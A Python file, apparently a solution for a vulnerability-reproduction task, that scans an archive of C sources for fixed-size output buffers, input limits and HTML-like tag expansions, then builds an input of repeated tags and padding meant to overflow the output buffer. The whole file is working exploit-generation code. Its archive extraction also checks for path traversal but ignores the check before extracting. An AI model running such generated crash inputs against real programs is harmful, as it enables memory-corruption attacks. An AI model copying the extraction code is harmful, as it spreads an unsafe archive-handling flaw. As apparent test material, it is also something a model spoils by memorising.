import os
import re
import io
import tarfile
import zipfile
import tempfile
from typing import Dict, List, Tuple, Optional


def _mask_c_code(s: str) -> str:
    n = len(s)
    out = list(s)
    i = 0
    NORMAL = 0
    LINE_COMMENT = 1
    BLOCK_COMMENT = 2
    STRING = 3
    CHAR = 4
    state = NORMAL
    while i < n:
        c = s[i]
        if state == NORMAL:
            if c == '/' and i + 1 < n and s[i + 1] == '/':
                out[i] = ' '
                out[i + 1] = ' '
                i += 2
                state = LINE_COMMENT
                continue
            if c == '/' and i + 1 < n and s[i + 1] == '*':
                out[i] = ' '
                out[i + 1] = ' '
                i += 2
                state = BLOCK_COMMENT
                continue
            if c == '"':
                out[i] = ' '
                i += 1
                state = STRING
                continue
            if c == "'":
                out[i] = ' '
                i += 1
                state = CHAR
                continue
            i += 1
            continue
        elif state == LINE_COMMENT:
            if c == '\n':
                i += 1
                state = NORMAL
            else:
                out[i] = ' '
                i += 1
            continue
        elif state == BLOCK_COMMENT:
            if c == '*' and i + 1 < n and s[i + 1] == '/':
                out[i] = ' '
                out[i + 1] = ' '
                i += 2
                state = NORMAL
            else:
                out[i] = ' '
                i += 1
            continue
        elif state == STRING:
            if c == '\\' and i + 1 < n:
                out[i] = ' '
                out[i + 1] = ' '
                i += 2
                continue
            if c == '"':
                out[i] = ' '
                i += 1
                state = NORMAL
                continue
            out[i] = ' '
            i += 1
            continue
        else:  # CHAR
            if c == '\\' and i + 1 < n:
                out[i] = ' '
                out[i + 1] = ' '
                i += 2
                continue
            if c == "'":
                out[i] = ' '
                i += 1
                state = NORMAL
                continue
            out[i] = ' '
            i += 1
            continue
    return ''.join(out)


def _c_unescape_len(s: str) -> int:
    i = 0
    n = len(s)
    L = 0
    while i < n:
        c = s[i]
        if c != '\\':
            L += 1
            i += 1
            continue
        i += 1
        if i >= n:
            L += 1
            break
        c2 = s[i]
        if c2 in ('a', 'b', 'f', 'n', 'r', 't', 'v', '\\', "'", '"', '?'):
            L += 1
            i += 1
            continue
        if c2 == 'x':
            i += 1
            hd = 0
            while i < n and hd < 2 and s[i] in '0123456789abcdefABCDEF':
                i += 1
                hd += 1
            L += 1
            continue
        if c2 in '01234567':
            od = 0
            while i < n and od < 3 and s[i] in '01234567':
                i += 1
                od += 1
            L += 1
            continue
        if c2 in ('u', 'U'):
            # Treat as one output char (not exact for wide), enough for heuristics
            i += 1
            cnt = 4 if c2 == 'u' else 8
            k = 0
            while i < n and k < cnt and s[i] in '0123456789abcdefABCDEF':
                i += 1
                k += 1
            L += 1
            continue
        L += 1
        i += 1
    return L


def _safe_read_text(path: str, max_bytes: int = 2_000_000) -> Optional[str]:
    try:
        st = os.stat(path)
        if st.st_size > max_bytes:
            return None
        with open(path, 'rb') as f:
            b = f.read()
        return b.decode('utf-8', errors='ignore')
    except Exception:
        return None


def _is_likely_source_file(name: str) -> bool:
    low = name.lower()
    if any(low.endswith(ext) for ext in ('.c', '.cc', '.cpp', '.cxx', '.h', '.hh', '.hpp', '.hxx')):
        return True
    if os.path.basename(low) in ('makefile', 'gnumakefile'):
        return True
    return False


def _extract_archive(src_path: str, dst_dir: str) -> str:
    if os.path.isdir(src_path):
        return src_path
    try:
        with tarfile.open(src_path, 'r:*') as tf:
            def is_within_directory(directory, target):
                abs_directory = os.path.abspath(directory)
                abs_target = os.path.abspath(target)
                prefix = os.path.commonpath([abs_directory, abs_target])
                return prefix == abs_directory

            for member in tf.getmembers():
                member_path = os.path.join(dst_dir, member.name)
                if not is_within_directory(dst_dir, member_path):
                    continue
            tf.extractall(dst_dir)
        entries = os.listdir(dst_dir)
        if len(entries) == 1:
            p = os.path.join(dst_dir, entries[0])
            if os.path.isdir(p):
                return p
        return dst_dir
    except Exception:
        pass
    try:
        with zipfile.ZipFile(src_path, 'r') as zf:
            zf.extractall(dst_dir)
        entries = os.listdir(dst_dir)
        if len(entries) == 1:
            p = os.path.join(dst_dir, entries[0])
            if os.path.isdir(p):
                return p
        return dst_dir
    except Exception:
        return dst_dir


def _collect_sources(root: str) -> List[Tuple[str, str]]:
    out = []
    for dp, _, fn in os.walk(root):
        for f in fn:
            if not _is_likely_source_file(f):
                continue
            p = os.path.join(dp, f)
            t = _safe_read_text(p)
            if t is None:
                continue
            out.append((p, t))
    return out


_TAG_IN_QUOTED_RE = re.compile(r'"(<\s*/?\s*[A-Za-z][A-Za-z0-9_-]{0,15}\s*>)"')
_TAG_ANY_RE = re.compile(r'<\s*/?\s*[A-Za-z][A-Za-z0-9_-]{0,15}\s*>')
_STRCPY_CAT_RE = re.compile(r'\bstr(?:cpy|cat)\s*\(\s*[^,]+,\s*"((?:\\.|[^"\\])*)"', re.DOTALL)
_MEMCPY_LIT_RE = re.compile(r'\bmemcpy\s*\(\s*[^,]+,\s*"((?:\\.|[^"\\])*)"\s*,\s*([0-9]+)\s*\)', re.DOTALL)

_CHAR_ARRAY_RE = re.compile(r'(^|[;\n\r])\s*(?!static\b)\s*char\s+([A-Za-z_]\w*)\s*\[\s*([0-9]{2,6})\s*\]\s*;', re.MULTILINE)
_FGETS_CONST_RE = re.compile(r'\bfgets\s*\(\s*([A-Za-z_]\w*)\s*,\s*([0-9]{2,6})\s*,')
_FGETS_SIZEOF_RE = re.compile(r'\bfgets\s*\(\s*([A-Za-z_]\w*)\s*,\s*sizeof\s*\(\s*([A-Za-z_]\w*)\s*\)\s*,')


def _find_markers(masked: str, original: str) -> List[int]:
    markers = []
    for m in re.finditer(r'\btag\b', masked, flags=re.IGNORECASE):
        markers.append(m.start())
    for m in re.finditer(r"'<'", masked):
        markers.append(m.start())
    for m in re.finditer(r'<=\s*\'<\'', masked):
        markers.append(m.start())
    for m in re.finditer(r"\bstrchr\s*\([^,]+,\s*'<'", masked):
        markers.append(m.start())
    for m in re.finditer(r'"<', original):
        markers.append(m.start())
    for m in re.finditer(_TAG_ANY_RE, original):
        markers.append(m.start())
    markers.sort()
    return markers


def _brace_depths(masked: str, positions: List[int]) -> List[int]:
    positions_sorted = sorted((p, idx) for idx, p in enumerate(positions))
    res = [0] * len(positions)
    depth = 0
    pi = 0
    n = len(masked)
    for i in range(n):
        c = masked[i]
        if c == '{':
            depth += 1
        elif c == '}':
            if depth > 0:
                depth -= 1
        while pi < len(positions_sorted) and positions_sorted[pi][0] == i:
            _, idx = positions_sorted[pi]
            res[idx] = depth
            pi += 1
        if pi >= len(positions_sorted) and i > max(positions):
            break
    # handle positions beyond scanned range (rare)
    while pi < len(positions_sorted):
        _, idx = positions_sorted[pi]
        res[idx] = depth
        pi += 1
    return res


def _extract_tag_mappings(text: str) -> Tuple[List[str], Dict[str, int]]:
    tags = []
    mapping: Dict[str, int] = {}
    for m in _TAG_IN_QUOTED_RE.finditer(text):
        tag = re.sub(r'\s+', '', m.group(1))
        tags.append(tag)
        start = m.end()
        window = text[start:start + 1200]
        best = 0
        for mm in _STRCPY_CAT_RE.finditer(window):
            rep = mm.group(1)
            rep_len = _c_unescape_len(rep)
            if rep_len > best:
                best = rep_len
        for mm in _MEMCPY_LIT_RE.finditer(window):
            rep = mm.group(1)
            nbytes = int(mm.group(2))
            rep_len = min(_c_unescape_len(rep), nbytes)
            if rep_len > best:
                best = rep_len
        if best > 0:
            mapping[tag] = max(mapping.get(tag, 0), best)
    # also collect any tags appearing unquoted, as fallback
    for m in _TAG_ANY_RE.finditer(text):
        tag = re.sub(r'\s+', '', m.group(0))
        tags.append(tag)
    # dedupe preserving order
    seen = set()
    uniq = []
    for t in tags:
        if t not in seen:
            seen.add(t)
            uniq.append(t)
    return uniq, mapping


def _choose_tag(tags: List[str], mapping: Dict[str, int]) -> Tuple[str, int]:
    best_tag = None
    best_ratio = -1.0
    best_rep = 0
    for t in tags:
        if not (t.startswith('<') and t.endswith('>')):
            continue
        if any(ch in t for ch in '\r\n\t'):
            continue
        tl = len(t)
        rep = mapping.get(t, 0)
        if rep <= 0:
            continue
        ratio = rep / max(1, tl)
        if ratio > best_ratio or (abs(ratio - best_ratio) < 1e-9 and tl < len(best_tag or t + "x")):
            best_ratio = ratio
            best_tag = t
            best_rep = rep
    if best_tag is not None:
        return best_tag, best_rep

    # fallback: choose shortest "simple" tag
    simple = []
    for t in tags:
        t2 = re.sub(r'\s+', '', t)
        if re.fullmatch(r'<\/?[A-Za-z][A-Za-z0-9_-]{0,15}>', t2):
            simple.append(t2)
    if simple:
        simple.sort(key=len)
        t = simple[0]
        tl = len(t)
        return t, tl + 1

    return "<b>", 4


def _nearest_distance(sorted_positions: List[int], pos: int) -> int:
    if not sorted_positions:
        return 10**9
    lo = 0
    hi = len(sorted_positions)
    while lo < hi:
        mid = (lo + hi) // 2
        if sorted_positions[mid] < pos:
            lo = mid + 1
        else:
            hi = mid
    best = 10**9
    if lo < len(sorted_positions):
        best = min(best, abs(sorted_positions[lo] - pos))
    if lo > 0:
        best = min(best, abs(sorted_positions[lo - 1] - pos))
    return best


def _analyze_sources(sources: List[Tuple[str, str]]) -> Tuple[int, int, str, int]:
    all_tags: List[str] = []
    tag_mapping: Dict[str, int] = {}

    output_candidates: List[Tuple[int, int, int, str]] = []  # (is_output, dist, size, name)
    input_sizes: List[int] = []

    for _, text in sources:
        tags, mapping = _extract_tag_mappings(text)
        all_tags.extend(tags)
        for k, v in mapping.items():
            tag_mapping[k] = max(tag_mapping.get(k, 0), v)

        masked = _mask_c_code(text)
        markers = _find_markers(masked, text)

        arrays = []
        positions = []
        for m in _CHAR_ARRAY_RE.finditer(masked):
            name = m.group(2)
            size = int(m.group(3))
            pos = m.start(2)
            positions.append(pos)
            arrays.append((name, size, pos, m.start()))
        if arrays:
            depths = _brace_depths(masked, positions)
        else:
            depths = []

        # Determine input sizes from fgets
        for m in _FGETS_CONST_RE.finditer(masked):
            n = int(m.group(2))
            if 16 <= n <= 1_000_000:
                input_sizes.append(n)
        for m in _FGETS_SIZEOF_RE.finditer(masked):
            var = m.group(2)
            for (name, size, _, _) in arrays:
                if name == var and 16 <= size <= 1_000_000:
                    input_sizes.append(size)
                    break

        # classify arrays
        for idx, (name, size, pos, mstart) in enumerate(arrays):
            if size < 64 or size > 65536:
                continue
            depth = depths[idx] if idx < len(depths) else 0
            if depth <= 0:
                continue
            # heuristic to avoid structs/typedefs
            line_start = text.rfind('\n', 0, mstart) + 1
            line_end = text.find('\n', mstart)
            if line_end == -1:
                line_end = len(text)
            line = text[line_start:line_end]
            if re.search(r'\b(typedef|struct|union|enum)\b', line):
                continue

            dist = _nearest_distance(markers, pos)
            is_output = 0
            # If used as dest in common string functions anywhere, mark output-ish
            if re.search(r'\bstr(?:cpy|cat|ncat|ncpy)\s*\(\s*' + re.escape(name) + r'\b', masked):
                is_output = 1
            if re.search(r'\bsnprintf\s*\(\s*' + re.escape(name) + r'\b', masked):
                is_output = 1
            if re.search(r'\bsprintf\s*\(\s*' + re.escape(name) + r'\b', masked):
                is_output = 1
            output_candidates.append((1 if is_output else 0, dist, size, name))

    # choose output buffer size O
    O = 1024
    if output_candidates:
        output_candidates.sort(key=lambda x: (0 if x[0] else 1, x[1], x[2]))
        O = output_candidates[0][2]

    # choose input cap I (per line). If none, assume generous.
    I = 0
    if input_sizes:
        # prefer a plausible upper bound, not enormous
        input_sizes = [x for x in input_sizes if 32 <= x <= 1_000_000]
        if input_sizes:
            I = max(input_sizes)
    if I <= 0:
        I = max(4096, O * 2)
    I = min(I, 131072)

    # choose tag and replacement length
    tag, rep_len = _choose_tag(all_tags, tag_mapping)
    # ensure rep_len sane
    if rep_len <= 0:
        rep_len = len(tag) + 1

    return O, I, tag, rep_len


class Solution:
    def solve(self, src_path: str) -> bytes:
        with tempfile.TemporaryDirectory() as td:
            root = _extract_archive(src_path, td)
            sources = _collect_sources(root)
            O, I, tag, rep_len = _analyze_sources(sources)

            tag_bytes = tag.encode('ascii', errors='ignore')
            if not tag_bytes:
                tag_bytes = b"<b>"
                rep_len = max(rep_len, 4)

            tag_len = len(tag_bytes)
            if tag_len <= 0:
                tag_bytes = b"<b>"
                tag_len = 3
                rep_len = max(rep_len, 4)

            # Aim to overflow output buffer by a small margin
            target_out = O + 64

            # Compute repeats needed by estimated expansion
            repeats_needed = (target_out + rep_len - 1) // rep_len
            # Ensure at least some sizeable input
            repeats_needed = max(repeats_needed, 8)

            # If input appears line-limited, respect it
            max_repeats_line = (max(1, I - 2)) // tag_len
            if max_repeats_line <= 0:
                max_repeats_line = repeats_needed

            if repeats_needed <= max_repeats_line:
                repeats = repeats_needed
            else:
                repeats = max_repeats_line
                # if this wouldn't exceed output size, add a little plain text to pad output too
                # (plain text length ~= output length in most converters)
                # We'll also try to push input length above O if allowed.
                pass

            line = tag_bytes * repeats

            # If we couldn't get enough estimated expansion, try to ensure overflow by length too (if not line-limited)
            est_out = repeats * rep_len
            if est_out < target_out:
                # Try to append some text outside tags (usually copied verbatim)
                # Keep within line cap if present
                desired_in = max(O + 32, len(line) + (target_out - est_out))
                if I > 0:
                    desired_in = min(desired_in, I - 2)
                if desired_in > len(line):
                    line += b"A" * (desired_in - len(line))

            # Final ensure tag presence early
            if b"<" not in line:
                line = b"<" + line

            return line + b"\n"